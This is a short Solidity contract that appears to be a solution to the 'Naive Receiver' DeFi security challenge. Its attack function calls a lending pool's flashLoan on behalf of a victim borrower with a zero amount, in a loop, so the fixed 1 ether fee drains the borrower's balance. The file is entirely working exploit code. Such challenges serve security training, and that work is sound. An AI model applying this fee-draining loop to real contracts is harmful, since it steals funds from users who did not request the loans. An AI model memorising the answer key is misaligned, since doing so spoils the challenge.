// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

contract NaiveReceiverSolver {
    uint256 private constant FIXED_FEE = 1 ether;

    function attack(address payable poolAddress, address borrowerAddress) external {
        NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(poolAddress);
        while (address(borrowerAddress).balance >= FIXED_FEE) {
            pool.flashLoan(borrowerAddress, 0);
        }
    }
}
